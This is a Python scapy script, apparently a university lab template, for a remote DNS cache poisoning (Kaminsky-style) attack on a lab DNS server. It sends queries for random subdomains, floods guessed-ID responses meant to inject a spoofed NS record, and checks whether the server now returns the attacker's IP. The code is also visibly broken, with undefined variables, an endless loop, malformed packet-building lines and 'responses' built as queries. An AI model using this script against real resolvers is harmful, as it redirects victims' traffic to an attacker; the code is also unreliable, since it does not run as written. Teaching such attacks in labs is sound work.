#! usr/bin/python3
#FIT3031 Teaching Team

from scapy.all import *
import random

#### ATTACK CONFIGURATION ####
ATTEMPT_NUM = 10000
dummy_domain_lst = []

#IP of our attacker's machine
attacker_ip = "10.0.0.2"

#IP of our victim's dns server
target_dns_ip =  "10.4.1.15"

#DNS Forwarder if local couldnt resolve
#or real DNS of the example.com
forwarder_dns = "8.8.8.8"

#dummy domains to ask the server to query
dummy_domain_prefix = "abcdefghijklmnopqrstuvwxy0987654321"
base_domain = ".test.com"
dummydomain = ""
domain = "new.test.com"

#target dns port
target_dns_port = 33333

spoof = "ns.spoofed.com"

# Step 1 : create a for loop to generate dummy hostnames based on ATTEMPT_NUM
# each dummy host should concat random substrings in dummy_domain_prefix and base_domain

#Your code goes here to generate 10000 dummy hostnames

# base packet
rep = IP(dst=target_dns_ip, src=srcdns[0])/ \
	UDP(sport=53, dport=dnsport)/ \
	DNS(id=99, qr=1, rd=1, ra=1, qdcount=1, ancount=1, nscount=1, arcount=0,
		qd=DNSQR(qname=dummydomain, qtype=1, qclass=1),
		an=DNSRR(rrname=dummydomain, ttl=70000, rdata=target_dns_ip, rdlen=4),
		ns=DNSRR(rrname=domain, rclass=1, ttl=70000, rdata=spoof, rdlen=len(spoof)+1, type=2)
	)


currentid = 1024
dummyid = 3
while 1:
	dummydomain = "a" + str(dummyid) + base_domain
	dummyid = dummyid + 1
	# request for our dummydomain
	req = IP(dst=target_dns_ip)/ \
	      UDP(sport=random.randint(10, 65000), dport=53)/ \
	      DNS(id=99, opcode=0, qr=0, rd=1, ra=0, qdcount=1, ancount=0, nscount=0, arcount=0,
			      qd=DNSQR(qname=dummydomain, qtype=1, qclass=1),
			      an=0,
			      ns=0,
			      ar=0
		)
	send(req)

	# build the response
	rep.getlayer(DNS).qd.qname = dummydomain
	rep.getlayer(DNS).an.rrname = dummydomain

print("Completed generating dummy domains")

#### ATTACK SIMULATION

for i in range(0,ATTEMPT_NUM):
    cur_domain = dummy_domain_lst[i]
    print("> url: " + cur_domain)

    ###### Step 2 : Generate a random DNS query for cur_domain to challenge the local DNS
    IPpkt = IP(dst=target_dns_ip)
    UDPpkt = UDP(sport=random.randint(1025, 65000), dport=53)
    DNSpkt = DNS(id=99, opcode=0, qr=0, rd=1, ra=0, qdcount=1, ancount=0, nscount=0, arcount=0,
            qd=DNSQR(qname=dummydomain, qtype=1, qclass=1),
            an=0,
            ns=0,
            ar=0
  )
    query_pkt = IPpkt/UDPpkt/DNSpkt
    send(query_pkt,verbose=0)

    ###### Step 3 : For that DNS query, generate 100 random guesses with random transactionID
    # to spoof the response packet

    for i in range(100):
        tran_id = currentid = currentid + 1

        IPpkt = IP(dst=targetdns)/ \
        UDPpkt = UDP(sport=random.randint(1025, 65000), dport=53)/ \
        DNSpkt =DNS(id=99, opcode=0, qr=0, rd=1, ra=0, qdcount=1, ancount=0, nscount=0, arcount=0,
                qd=DNSQR(qname=dummydomain, qtype=1, qclass=1),
                an=0,
                ns=0,
                ar=0
      )

        response_pkt = IPpkt/UDPpkt/DNSpkt
        send(response_pkt,verbose=0)

    ####### Step 4 : Verify the result by sending a DNS query to the server
    # and double check whether the Answer Section returns the IP of the attacker (i.e. attacker_ip)
    IPpkt = IP(dst=target_dns_ip)
    UDPpkt = UDP(sport=random.randint(1025,65000),dport =53)
    DNSpkt = DNS(id=99,rd=1,qd=DNSQR(qname=cur_domain))

    query_pkt = IPpkt/UDPpkt/DNSpkt
    z = sr1(query_pkt,timeout=2,retry=0,verbose=0)
    try:
        if(z[DNS].an.rdata == attacker_ip):
                print("Poisonned the victim DNS server successfully.")
                break
    except:
             print("Poisonning failed")

#### END ATTACK SIMULATION
